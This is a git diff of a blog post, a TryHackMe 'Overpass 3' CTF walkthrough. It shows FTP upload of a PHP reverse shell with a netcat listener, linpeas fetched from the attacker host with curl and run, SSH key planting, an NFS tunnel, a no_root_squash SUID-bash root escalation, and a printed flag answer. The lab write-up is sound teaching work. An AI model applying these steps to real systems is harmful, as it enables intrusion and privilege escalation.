@@ -1,32 +1,362 @@
 ---
 layout: post
 title:  "TryHackMe: 'Overpass 3 - Hosting' Walkthrough"
+sTitle: overpass3
 author: Louie Holbrook
 date:   2022-04-30 14:56:16 +0100
+permalink: /:categories/overpass3.html
 categories: walkthroughs tryhackme
 tags: walkthroughs tryhackme
-permalink: /:categories/overpass3.html
 ---
-You’ll find this post in your `_posts` directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run `jekyll serve`, which launches a web server and auto-regenerates your site when a file is updated.
 
-Jekyll requires blog post files to be named according to the following format:
+## Nmap scan
 
-`YEAR-MONTH-DAY-title.MARKUP`
-
-Where `YEAR` is a four-digit number, `MONTH` and `DAY` are both two-digit numbers, and `MARKUP` is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.
-
-Jekyll also offers powerful support for code snippets:
-
-{% highlight ruby %}
-def print_hi(name)
-  puts "Hi, #{name}"
-end
-print_hi('Tom')
-#=> prints 'Hi, Tom' to STDOUT.
+Scan with Nmap to see what services are open.
+{% highlight shell %}
+sudo nmap -T4 -sCV -p- 10.10.15.11
+# -T4     Increase the speed of the scan
+# -sCV    Execute default sCripts and determine Version info
+# -p-     Scan all ports (1 through 65535)
 {% endhighlight %}
 
-Check out the [Jekyll docs][jekyll-docs] for more info on how to get the most out of Jekyll. File all bugs/feature requests at [Jekyll’s GitHub repo][jekyll-gh]. If you have questions, you can ask them on [Jekyll Talk][jekyll-talk].
+The following ports are open.
 
-[jekyll-docs]: https://jekyllrb.com/docs/home
-[jekyll-gh]:   https://github.com/jekyll/jekyll
-[jekyll-talk]: https://talk.jekyllrb.com/
+![Open ports found using Nmap](/assets/posts/2022-04-30-overpass3/Screenshot 2022-05-03 at 05.59.37.png)
+
+## Port 21 - FTP (1)
+
+I tried to log into the FTP client with the `anonymous` account, but it didn't work.
+
+{% include /extras/protocols/ftp/anonymous-login.markdown %}
+
+## Port 80 - HTTP
+
+Accessing the website hosted on port 80 shows the landing page for a "web and email hosting" business:
+
+![Overpass website landing page](/assets/posts/2022-04-30-overpass3/Screenshot 2022-05-04 at 05.16.48.png)
+
+The {% include link.html href="https://addons.mozilla.org/en-GB/firefox/addon/wappalyzer/" text="Firefox Wappalyzer extension" %} tells me the website is using Apache 2.4.37.
+
+The source code for this page doesn't reveal any comments that could lead to further information.
+
+![Overpass website landing page source code](/assets/posts/2022-04-30-overpass3/Screenshot 2022-05-03 at 06.57.58.png)
+
+At the bottom of the landing page there are aliases for each team member. These might come in handy later on so I'll note them down.
+
+![Overpass team members](/assets/posts/2022-04-30-overpass3/Screenshot 2022-05-04 at 05.23.55.png)
+
+<h3 id="directory-scan">2.1 Directory Scan</h3>
+
+I used DIRB to find any directories - hidden or otherwise.
+
+{% highlight shell %}
+$ dirb http://<ip>
+# Taken from the DIRB man page:
+# DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary basesd [sic] attack against a web server and analizing the response.
+{% endhighlight %}
+
+![Dirb results](/assets/posts/2022-04-30-overpass3/Screenshot 2022-05-04 at 05.47.18.png)
+
+Which returns the following directories and files:
+
+{% highlight plain text %}
+/backups
+/cgi-bin
+/index.html
+{% endhighlight%}
+
+The `/index.html` endpoint returns the default landing page so we won't revisit it. We will explore the `/backups` and `/cgi-bin` directories further.
+
+<h4 id="/backups">2.1.1 /backups</h4>
+
+Requesting the `/backups` directory returns a directory index:
+
+![Directory index at /backups](/assets/posts/2022-04-30-overpass3/Screenshot 2022-05-04 at 05.50.17.png)
+
+{% include /extras/websites/apache-directory-index.markdown %}
+
+Download the `backup.zip` file and unzip the contents.
+
+{% highlight shell %}
+$ unzip backup.zip -d backup
+# -d    extract the files to the folder 'backup'
+{% endhighlight%}
+
+Unzipped are two files:
+- `priv.key` - a PGP private key
+- `CustomerDetails.xlsx.gpg` - an encrypted Excel spreadsheet
+
+We know the `priv.key` file is a PGP key by `cat`ting the file.
+
+{% include extras/cryptography/pgp.markdown %}
+
+We can use the `gpg` command line tool to unencrypt `CustomerDetails.xlsx.gpg` using `priv.key`.
+
+{% highlight shell %}
+# Import the key-file
+$ gpg --import priv.key
+
+# Decrypt the xlsx file and save the unencrypted output to a suitable file
+$ gpg -o CustomerDetails.xlsx --decrypt CustomerDetails.xlsx.gpg
+{% endhighlight %}
+
+Now we have the unencrypted `xlsx` file, we can view it. I was having problems opening it natively so I used an <a href="https://products.aspose.app/cells/viewer/xlsx" target="_blank">online xlsx file viewer</a>.
+
+![Contents of xlsx file](/assets/posts/2022-04-30-overpass3/Screenshot 2022-05-07 at 19.29.02.png)
+
+I tried these credentials on the SSH port (22), but none
+worked. Interestingly though, the SSH client on the victim machine didn't offer the option to authenticate using a password for the `paradox` user, but did for the other two.
+
+![SSH permission denied](/assets/posts/2022-04-30-overpass3/Screenshot 2022-05-12 at 05.21.52.png)
+
+You can see the error message lists the authentication methods that were available to be used for the user `paradox`, with `password` not being one of them:
+
+{% highlight shell %}
+paradox@10.10.163.131: Permission denied (publickey,gssapi-keyex,gssapi-with-mic)
+{% endhighlight %}
+
+<h2 id="port-21">Port 21 - FTP (2)</h2>
+
+The `paradox` credential worked.
+
+![Successful login to FTP](/assets/posts/2022-04-30-overpass3/Screenshot 2022-05-09 at 05.25.18.png)
+
+Transferring the `index.html` file to my machine and `cat`ting its contents suggests the files hosted on this FTP server at the same files used for the website hosted on port 80.
+
+{% highlight shell %}
+# Download index.html
+ftp> get index.html
+{% endhighlight %}
+
+Since we are logged in as a non-anonymous user, it's possible we have write permissions to this FTP directory. If so, we could upload a reverse shell script and then access it via the website hosted on port 80, thus causing the script to be executed by the server.
+
+To test this, I uploaded a text file `test.txt`... and it worked.
+
+![Testing FTP uploads](/assets/posts/2022-04-30-overpass3/Screenshot 2022-05-09 at 06.28.40.png)
+
+### Uploading a Reverse Shell
+
+I uploaded my {% include link.html href="https://github.com/pentestmonkey/php-reverse-shell" text="reverse shell script" %} to the FTP directory,
+
+![Testing FTP uploads](/assets/posts/2022-04-30-overpass3/Screenshot 2022-05-09 at 06.39.27.png)
+
+set up a netcat listener,
+
+{% highlight shell %}
+$ nc -lvnp 8888
+# -l    listen mode
+# -v    verbose
+# -n    numeric-only IP addresses (no DNS)
+# -p    port number <8888>
+{% endhighlight %}
+
+navigated to the uploaded reverse shell script,
+
+{% highlight HTPP %}
+http://10.10.134.110/php-reverse-shell.php
+{% endhighlight %}
+
+which resulted in receiving an incoming connection.
+
+![Incoming connection received](/assets/posts/2022-04-30-overpass3/Screenshot 2022-05-09 at 06.49.49.png)
+
+I am currently the `apache` user:
+
+![id command results](/assets/posts/2022-04-30-overpass3/Screenshot 2022-05-09 at 06.52.28.png)
+
+## Web Flag
+
+I wanted to upgrade to a TTY shell with Python:
+
+{% highlight shell %}
+python -c 'import pty; pty.spawn("/bin/bash")'
+sh: python: command not found
+{% endhighlight %}
+
+But as you can see, Python was not installed. *Update: `python3` is installed on the machine so the above command will work when you substitute `python` for `python3`. If that hadn't worked I could have tried the command `/bin/bash -i`, but it turns out in this instance that wouldn't have produced a more stable shell as `/bin/sh` points to `/bin/bash` on the victim machine (there's a symbolic link)*.
+
+I used the `find` command to try and find the Web Flag:
+
+{% highlight shell %}
+# Starting at the '/' (root) directory, do a case insensitive
+# search for files matching *.txt or *.flag respectively and
+# redirect all error messages to the /dev/null folder
+$ find / -type f -iname *.txt 2>/dev/null
+$ find / -type f -iname *.flag 2>/dev/null
+{% endhighlight %}
+
+The second command returned a `web.flag` file located at :
+
+{% highlight shell %}
+/usr/share/httpd/web.flag
+{% endhighlight %}
+
+Web Flag:
+
+{% include answer.html answer="thm{0ae72f7870c3687129f7a824194be09d}" %}
+
+## User Flag
+
+I used `su` to see if I could change to one of the users whos credentials we got from the `xlsx` file, and it worked.
+
+{% highlight shell %}
+su paradox
+Password: ShibesAreGreat123
+{% endhighlight %}
+
+### Logging in with SSH
+
+I'm still using a TTY-less shell. It'd be better to log in as `paradox` using SSH, but the way the SSH client has been configured on the victim machine means that `password` logins are disabled. `publickey` authentications were enabled though. As per the {% include link.html href="https://man.openbsd.org/ssh#AUTHENTICATION" text="SSH manual," %} the SSH client on the victim machine will use the `~/.ssh/authorized_keys` file to check that an attempted login is authorised; only those that hold the corresponding private keys to the public keys stored in the `authorized_keys` file will be authenticated, so, I must add my public key to this file.
+
+`cat`ting the `authorized_keys` file shows there is already a public key in there for the user `paradox`.
+
+![authorized_keys file](/assets/posts/2022-04-30-overpass3/Screenshot 2022-05-12 at 06.16.16.png)
+
+My public key was stored at `~/.ssh/id_rsa.pub`. If you don't have one you can generate one using the command:
+{% highlight shell %}
+$ ssh-keygen
+{% endhighlight %}
+
+I copied my public key to the `authorized_keys` file on the victim machine. Replace `<public-key>` with yours.
+
+{% highlight shell %}
+$ echo "<public-key>" >> authorized_keys
+{% endhighlight %}
+
+I've now logged in as `paradox` using SSH.
+
+![Logging in as paradox using SSH](/assets/posts/2022-04-30-overpass3/Screenshot 2022-05-12 at 06.29.01.png)
+
+### Flag Finding
+
+Using the same `find` commands previously used to search for flag files didn't return anything.
+
+### Lateral Move to `james`
+
+It seems there is another user `james` on the machine.
+
+![Users within /home](/assets/posts/2022-04-30-overpass3/Screenshot 2022-05-10 at 06.35.53.png)
+
+But we don't have access rights to the `james` directory.
+
+I started the process for executing `linpeas.sh` on the victim machine. I initially used `wget`, but it wasn't installed so I used `curl` instead.
+
+{% highlight shell %}
+# Attacking machine: run python's http server module
+$ python -m http.server
+# Victim machine: move into /tmp directory as it has necessary write permissions
+$ cd /tmp
+# Victim machine: retrieve the linpeas.sh file hosted on the attacking machine
+$ wget http://<ip>:8000/linpeas.sh
+# Second attempt using curl
+$ curl -O http://<ip>:8000/linpeas.sh
+# Victim machine: give execute permissions to the files
+$ chmod +x linpeas.sh
+# Victim machine: execute linpeas.sh
+$ ./linpeas.sh
+{% endhighlight %}
+
+An alternative would have been to utilise the `FTP` server and upload `linpeas.sh` that way.
+
+{% include /extras/languages/python/http-server.markdown %}
+
+Two possible attack vectors are found:
+
+![Possible attack vector 1](/assets/posts/2022-04-30-overpass3/Screenshot 2022-05-11 at 05.41.58.png)
+
+![Possible attack vector 2](/assets/posts/2022-04-30-overpass3/Screenshot 2022-05-11 at 05.42.22.png)
+
+`CVE-2021-4034` relates to {% include link.html href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034" text="PwnKit." %} I tried to use various exploitation executables downloaded from GitHub, but couldn't get it to work. That leaves the `no_root_squash` attack vector.
+
+### no_root_squash
+
+The `linpeas.sh` script has highlighted the `/etc/exports` file, because an entry within it has the `no_root_squash` option set. The `/etc/exports` file is a configuration file for the NFS client running on the machine.
+
+{% include /extras/protocols/nfs/nfs.markdown %}
+{% include /extras/protocols/nfs/etc-exports.markdown %}
+{% include /extras/protocols/nfs/no-root-squash.markdown %}
+
+I tried to connect to the NFS service but it timed out. I then remembered that the Nmap scan didn't show the NFS service, which suggests the NFS service is available only locally.
+
+![NFS timed out](/assets/posts/2022-04-30-overpass3/Screenshot 2022-05-16 at 06.11.11.png)
+
+I need to trick the NFS service on the victim machine to think it is being accessed from the localhost. To do this, I set up a SSH tunnel.
+
+To do this I need to know what port the NFS service is using on the victim machine.
+
+{% highlight shell %}
+[victim@machine]$ rpcinfo -p | grep nfs
+# -p      probe the host machine
+{% endhighlight %}
+
+The NFS service is running on port `2049`.
+
+![Port used for NFS service on victim machine](/assets/posts/2022-04-30-overpass3/Screenshot 2022-05-16 at 06.35.31.png)
+
+I used this information in my SSH tunnel command.
+
+{% highlight shell %}
+$ ssh -fN -L 2048:localhost:2049 paradox@10.10.4.177
+# -L      forward calls on (local) port 2048 to port 2049 on host paradox@10.10.4.177
+# -f      tell SSH to go to background before command execution
+# -N      don't execute a remote command
+{% endhighlight %}
+
+{% include /extras/protocols/ssh/ssh-tunnel.markdown %}
+
+I can now make a request to mount the NFS files.
+
+{% highlight shell %}
+$ sudo mount -t nfs -o port=2049 localhost:/ /tmp/share
+# sudo    execute the command as root to take advantage of norootsquash
+# -t      select the filesystem type to be mounted
+# -o      specify options
+# port    the local port number to send the request to
+{% endhighlight %}
+
+The reason why I don't mount the `/home/james` directory is because the export has the `fsid=0` option set, which, for NFSv4, allows the exported filesystem to be referenced by a single forward-slash `/`. I found out if I were to identify the nfs share with `/home/james` I would have to initialise a further two SSH tunnels, namely:
+
+{% highlight shell %}
+$ ssh -fN -L 111:localhost:111 paradox@10.10.4.177
+$ ssh -fN -L 20048:localhost:20048 paradox@10.10.4.177
+{% endhighlight %}
+
+These two SSH tunnels handle the other services used for NFS: RPC portmapper port 111 and NFS mount port 20048.
+
+Why this is the case, I haven't been able to find out! Please get in touch if you know why!
+
+Once mounted, I moved into `tmp/share` directory.
+
+![Mounted root directory contents](/assets/posts/2022-04-30-overpass3/Screenshot 2022-05-18 at 05.33.07.png)
+
+Given what was inside the `.ssh` directory, I can now log in as the user `james` by either:
+1. Adding my public key to the `authorized_keys` directory (we can do this because the NFS share gives read and write privileges).
+2. Using the `id_rsa` private key file whilst logging in as `james`.
+
+![Mounted .ssh directory contents](/assets/posts/2022-04-30-overpass3/Screenshot 2022-05-18 at 05.34.58.png)
+
+I chose the second option as a change.
+
+{% highlight shell %}
+$ pwd
+/tmp/share/.ssh
+$ ssh -i id_rsa james@10.10.30.248
+{% endhighlight %}
+
+## Root Flag
+
+{% highlight shell %}
+# Navigate to the mounted directory
+[attacking@machine]$ cd /tmp/share
+# Switch to root user
+[attacking@machine]$ sudo su
+# Copy the bash executable to the mounted directory
+[attacking@machine]$ cp /bin/bash .
+# Set SUID permissions
+[attacking@machine]$ chmod +s bash
+# Navigate to the exported directory on the victim machine
+[attacking@machine]$ cd /home/james
+# Execute the bash executable with permission of the owner
+[attacking@machine]$ ./bash -p
+# -p    run file as the effective user (i.e. root)
+{% endhighlight %}
